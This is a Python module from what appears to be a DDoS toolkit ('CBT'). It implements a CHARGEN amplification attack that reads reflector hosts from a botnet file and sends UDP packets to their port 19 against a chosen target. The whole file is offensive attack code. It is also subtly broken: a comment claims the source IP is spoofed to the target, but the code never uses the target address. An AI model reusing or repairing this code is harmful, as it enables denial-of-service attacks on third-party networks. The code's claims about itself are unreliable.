#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy import *
except:
    print("\nError importing: scapy lib.\n")
    sys.exit(2)

# CBT Chargen Amplification (CHARGEN)
def sIP(chargens):
    try:
        chargen = random.choice(chargens)
        if chargen.startswith('http://'):
            chargen = chargen.replace('http://','')
        elif chargen.startswith('https://'):
            chargen = chargen.replace('https://','')
        try:
            ip = socket.gethostbyname(chargen)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(chargen)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = None
        return ip
    except:
        return None

def chargenize(ip, port, rounds):
    f = open('botnet/chargens.txt')
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_chargen_ip = sIP(base_stations)
            if s_chargen_ip == None:
                print("[Error] [AI] [CHARGEN] Impossible to retrieve 'base stations' -> [Aborting!]\n")
                break
            # Chargen amplification - any character triggers response
            payload = b'\x00'
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                # Spoof source IP to target
                sock.sendto(payload, (s_chargen_ip, 19))
                print("[Info] [AI] [CHARGEN] Redirecting 'base station' ["+str(n)+"] ["+str(s_chargen_ip)+"] -> [AMPLIFYING!]")
                time.sleep(0.1)
                sock.close()
            except:
                print("[Error] [AI] [CHARGEN] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_chargen_ip)+"]")
    except:
        print("[Error] [AI] [CHARGEN] Failing to engage... -> Is still target online? -> [Checking!]")

class CHARGEN(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] Chargen Amplification (CHARGEN) is ready to fire: [" , rounds, "amplification pulses ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(target)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [CHARGEN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        chargenize(ip, port, rounds)
